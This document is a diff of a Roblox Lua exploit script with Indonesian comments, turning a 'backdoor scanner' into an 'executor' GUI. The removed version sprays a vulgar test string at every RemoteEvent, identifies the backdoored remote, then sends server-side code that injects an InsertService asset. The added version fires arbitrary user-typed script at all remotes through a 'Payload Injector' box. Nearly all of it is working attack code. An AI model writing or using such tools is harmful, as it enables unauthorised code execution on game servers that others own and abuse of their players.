@@ -1,138 +1,164 @@
-local Players = game:GetService("Players")
-local CoreGui = game:GetService("CoreGui")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
-local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
 
--- 1. Pembersihan GUI Lama
-if CoreGui:FindFirstChild("SptzyySecurityTest") then
-    CoreGui.SptzyySecurityTest:Destroy()
-end
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "SptzyySecurityTest"
-ScreenGui.Parent = CoreGui
-ScreenGui.ResetOnSpawn = false
-
--- 2. Frame Utama (Bisa Digeser)
-local MainFrame = Instance.new("Frame")
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-MainFrame.Position = UDim2.new(0.5, -125, 0.5, -100)
-MainFrame.Size = UDim2.new(0, 250, 0, 200)
-MainFrame.Active = true
-MainFrame.Draggable = true 
-
-local UICorner = Instance.new("UICorner", MainFrame)
-UICorner.CornerRadius = UDim.new(0, 10)
-
-local UIStroke = Instance.new("UIStroke", MainFrame)
-UIStroke.Color = Color3.fromRGB(0, 255, 255)
-UIStroke.Thickness = 2
-
--- 3. Header
-local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.BackgroundTransparency = 1
-Title.Text = "BACKDOOR SCANNER"
-Title.TextColor3 = Color3.fromRGB(0, 255, 255)
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 14
-
--- 4. Tombol Scan (Menggantikan input username karena logikanya otomatis)
-local ScanBtn = Instance.new("TextButton", MainFrame)
-ScanBtn.Name = "ScanBtn"
-ScanBtn.Position = UDim2.new(0.1, 0, 0.3, 0)
-ScanBtn.Size = UDim2.new(0.8, 0, 0, 50)
-ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 150)
-ScanBtn.Text = "START SECURITY SCAN"
-ScanBtn.TextColor3 = Color3.white
-ScanBtn.Font = Enum.Font.GothamBold
-ScanBtn.TextSize = 14
-Instance.new("UICorner", ScanBtn).CornerRadius = UDim.new(0, 6)
-
--- 5. Status Label
-local StatusLabel = Instance.new("TextLabel", MainFrame)
-StatusLabel.Position = UDim2.new(0.1, 0, 0.65, 0)
-StatusLabel.Size = UDim2.new(0.8, 0, 0, 50)
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Text = "Status: Ready to test game security."
-StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-StatusLabel.Font = Enum.Font.Gotham
-StatusLabel.TextSize = 12
-StatusLabel.TextWrapped = true
-
--- 6. Logika Fitur (Sesuai Permintaan)
-ScanBtn.MouseButton1Click:Connect(function()
-    ScanBtn.Text = "SCANNING..."
-    ScanBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    StatusLabel.Text = "Scanning Remotes..."
-    
-    local modelName = "sptzyy"
-    local zyy = nil
-    local lastFired = nil
-    local payload = "\n KONTOL MESUM😂\n"
-
-    -- Bersihkan model lama jika ada
-    for _, obj in ipairs(workspace:GetChildren()) do
-        if obj.Name == modelName then
-            obj:Destroy()
-        end
-    end
-
-    -- Listener untuk mendeteksi apakah payload memicu spawn model
-    local connection
-    connection = workspace.ChildAdded:Connect(function(child)
-        if child.Name == modelName and zyy == nil then
-            zyy = lastFired
-            StatusLabel.Text = "✅ FOUND VULNERABILITY: " .. zyy.Name
-            StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-            print("Found zyy!")
-            connection:Disconnect()
+-- Fungsi untuk membuat UI bisa digeser (Draggable)
+local function makeDraggable(frame)
+    local dragging, dragInput, dragStart, startPos
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
         end
     end)
-
-    -- Proses Scanning
-    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
-        if remote:IsA("RemoteEvent") then
-            pcall(function()
-                remote:FireServer(payload)
-            end)
-            lastFired = remote
-            RunService.RenderStepped:Wait()
+    frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
         end
-    end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
 
-    task.wait(0.5)
+-- Create ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SptzyyExecutorUI"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
 
-    -- Eksekusi Payload Lanjutan jika celah ditemukan
-    if zyy and typeof(zyy) == "Instance" then
-        local playerName = Players.LocalPlayer.Name
-        local insertPayload = [[
-            local player = game.Players:FindFirstChild("]] .. playerName .. [[")
-            if player and player:FindFirstChild("PlayerGui") then
-                local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
-                asset.Parent = player.PlayerGui
-                for _, child in ipairs(asset:GetChildren()) do
-                    child.Parent = player.PlayerGui
-                end
-                asset:Destroy()
-            end
-        ]]
-        zyy:FireServer(insertPayload)
-        StatusLabel.Text = "✅ Test Succeeded: Asset Injected."
-    else
-        StatusLabel.Text = "❌ No Backdoors Found (Safe)."
-        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-        StarterGui:SetCore("SendNotification", {
-            Title = "sptzyy",
-            Text = "Security Clean :(",
-            Duration = 5,
-        })
-    end
+-- --- MAIN GUI ---
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 300, 0, 350)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -175)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
 
-    if connection then connection:Disconnect() end
-    ScanBtn.Text = "RE-SCAN"
-    ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 150)
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = MainFrame
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(0, 255, 255) -- Neon Cyan
+UIStroke.Thickness = 2
+UIStroke.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Text = "SPTZYY MAIN LIST"
+Title.TextColor3 = Color3.fromRGB(0, 255, 255)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 18
+Title.Parent = MainFrame
+
+local FeatureList = Instance.new("ScrollingFrame")
+FeatureList.Size = UDim2.new(1, -20, 1, -60)
+FeatureList.Position = UDim2.new(0, 10, 0, 45)
+FeatureList.BackgroundTransparency = 1
+FeatureList.CanvasSize = UDim2.new(0, 0, 2, 0)
+FeatureList.ScrollBarThickness = 2
+FeatureList.Parent = MainFrame
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Padding = UDim.new(0, 10)
+UIListLayout.Parent = FeatureList
+
+-- Button to open Payload GUI
+local OpenPayloadBtn = Instance.new("TextButton")
+OpenPayloadBtn.Size = UDim2.new(1, 0, 0, 40)
+OpenPayloadBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+OpenPayloadBtn.Text = "Custom Payload Runner"
+OpenPayloadBtn.TextColor3 = Color3.white
+OpenPayloadBtn.Font = Enum.Font.Gotham
+OpenPayloadBtn.Parent = FeatureList
+
+-- --- PAYLOAD GUI ---
+local PayloadFrame = Instance.new("Frame")
+PayloadFrame.Name = "PayloadFrame"
+PayloadFrame.Size = UDim2.new(0, 350, 0, 250)
+PayloadFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
+PayloadFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+PayloadFrame.Visible = false
+PayloadFrame.Parent = ScreenGui
+
+Instance.new("UICorner", PayloadFrame).CornerRadius = UDim.new(0, 8)
+local PStroke = Instance.new("UIStroke", PayloadFrame)
+PStroke.Color = Color3.fromRGB(0, 255, 255)
+PStroke.Thickness = 2
+
+local PTitle = Instance.new("TextLabel")
+PTitle.Size = UDim2.new(1, 0, 0, 40)
+PTitle.Text = "PAYLOAD INJECTOR"
+PTitle.TextColor3 = Color3.fromRGB(0, 255, 255)
+PTitle.BackgroundTransparency = 1
+PTitle.Font = Enum.Font.GothamBold
+PTitle.Parent = PayloadFrame
+
+local InputBox = Instance.new("TextBox")
+InputBox.Size = UDim2.new(0.9, 0, 0, 100)
+InputBox.Position = UDim2.new(0.05, 0, 0.2, 0)
+InputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+InputBox.Text = ""
+InputBox.PlaceholderText = "Masukkan script payload di sini..."
+InputBox.TextColor3 = Color3.white
+InputBox.ClearTextOnFocus = false
+InputBox.MultiLine = true
+InputBox.TextWrapped = true
+InputBox.Parent = PayloadFrame
+
+local RunBtn = Instance.new("TextButton")
+RunBtn.Size = UDim2.new(0.4, 0, 0, 40)
+RunBtn.Position = UDim2.new(0.05, 0, 0.75, 0)
+RunBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+RunBtn.Text = "FIRE REMOTE"
+RunBtn.TextColor3 = Color3.white
+RunBtn.Parent = PayloadFrame
+
+local BackBtn = Instance.new("TextButton")
+BackBtn.Size = UDim2.new(0.4, 0, 0, 40)
+BackBtn.Position = UDim2.new(0.55, 0, 0.75, 0)
+BackBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+BackBtn.Text = "BACK"
+BackBtn.TextColor3 = Color3.white
+BackBtn.Parent = PayloadFrame
+
+-- --- LOGIC ---
+
+makeDraggable(MainFrame)
+makeDraggable(PayloadFrame)
+
+OpenPayloadBtn.MouseButton1Click:Connect(function()
+	MainFrame.Visible = false
+	PayloadFrame.Visible = true
+end)
+
+BackBtn.MouseButton1Click:Connect(function()
+	PayloadFrame.Visible = false
+	MainFrame.Visible = true
+end)
+
+RunBtn.MouseButton1Click:Connect(function()
+	local customPayload = InputBox.Text
+	for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
+		if remote:IsA("RemoteEvent") then
+			pcall(function()
+				remote:FireServer(customPayload)
+			end)
+		end
+	end
+	
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Status",
+		Text = "Payload Fired to Remotes!",
+		Duration = 3
+	})
 end)
